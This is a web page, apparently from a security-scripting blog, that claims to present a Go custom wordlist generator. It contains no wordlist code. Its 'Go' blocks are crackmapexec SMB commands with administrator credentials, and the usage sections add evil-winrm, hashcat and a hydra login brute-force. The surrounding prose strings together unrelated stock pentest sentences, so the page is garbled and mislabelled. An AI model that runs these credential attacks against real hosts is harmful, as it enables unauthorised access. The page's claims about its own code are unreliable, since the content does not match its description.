---
TitleSEO: "Custom Wordlist Generator in Go | ZureFX"
TitlePost: "Custom Wordlist Generator — Go"
Author: "ZureFX"
Description: "A Go script for custom wordlist generator. Built for security research and automation."
Keywords: "parser, automation, fuzzer, scanner, bash, script, go"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-152.html"
URL_IMAGES: ""
Date: "2024-05-12"
Tags: "Parser, Automation, Fuzzer, Scanner, Bash, Script, Go"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-152"
Permalink: "/scripting/script-custom-wordlist-generator-152.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `hydra`
- `ldapsearch`
- `bloodhound`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

```go
crackmapexec smb 10.18.96.114 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.47.200.142 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```go
crackmapexec smb 10.119.16.2 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.17.59.200 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.114.110.160 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.180.11 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 27.14s
```
